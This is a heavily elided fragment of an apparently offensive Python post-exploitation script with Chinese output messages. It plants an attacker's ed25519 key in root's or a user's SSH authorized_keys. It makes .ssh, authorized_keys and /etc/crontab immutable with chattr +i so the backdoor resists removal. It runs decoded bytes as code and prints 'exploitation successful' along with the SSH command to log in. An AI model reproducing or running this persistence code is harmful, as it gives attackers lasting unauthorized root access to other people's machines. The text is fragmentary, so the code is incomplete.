...
if __name__ == '__main__':
    ...
    if 'root' in user:
        ...
        (not id_ed25519_pub in a)):
            ...
            ml('chattr +i /root/.ssh && chattr +i /root/.ssh/authorized_keys && chattr +i /etc/crontab')
    else:
        sshdir = ml('lsattr -d /home/'+user+'/.ssh/').strip()[:16]
        a = ml('cat /home/'+user+'/.ssh/authorized_keys') 
...
run_code(decoded_bytes)
    ...
    ml('chattr +i /etc/crontab')
    if 'root' in user:
        if id_ed25519_pub in ml('cat /root/.ssh/authorized_keys'):
            print('密钥写入成功')
            print('----->利用成功,生成的用户为:', ml('whoami').strip(), '<-----')
            print('----->连接命令: ssh -i 密钥文件 ' + str(ml('whoami').strip()) + '@ip <-----')
    else:
        if id_ed25519_pub in ml('cat /home/' + user + '/.ssh/authorized_keys'):
            print('密钥写入成功')
            print('----->利用成功,生成的用户为:', ml('whoami').strip(), '<-----')
            print('----->连接命令: ssh -i 密钥文件 ' + str(ml('whoami').strip()) + '@ip <-----')
